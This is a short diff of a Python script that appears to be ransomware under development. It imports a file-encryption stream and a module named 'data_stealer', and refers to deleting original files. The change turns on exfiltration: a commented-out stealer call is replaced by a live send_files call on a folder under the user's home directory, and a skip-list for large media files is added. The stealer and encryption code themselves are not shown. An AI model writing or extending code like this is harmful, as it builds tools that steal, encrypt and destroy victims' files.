@@ -3,11 +3,13 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from crypto.encrypt import SecureFileCryptoStream
 from software_gui import run_gui
-from server.steal_data import run_stealer
+from server.data_stealer import send_files
 
 crypto = SecureFileCryptoStream()
 
 ALLOWED_EXTENSIONS = {".txt", ".pdf"}
+
+SKIP_EXTANSIONS = {".mp4", ".mp3", ".png", ".jpeg"} # skip too big
 
 
 def get_user_dirs() -> list[Path]:
@@ -60,7 +62,11 @@ def delete_original_files():
 
 def main():
 
-    #run_stealer()
+    PATHS = [
+        Path.home() / "Desktop" / "myapp"#,   
+    ]
+
+    send_files(PATHS)
 
     directories = get_user_dirs()
 
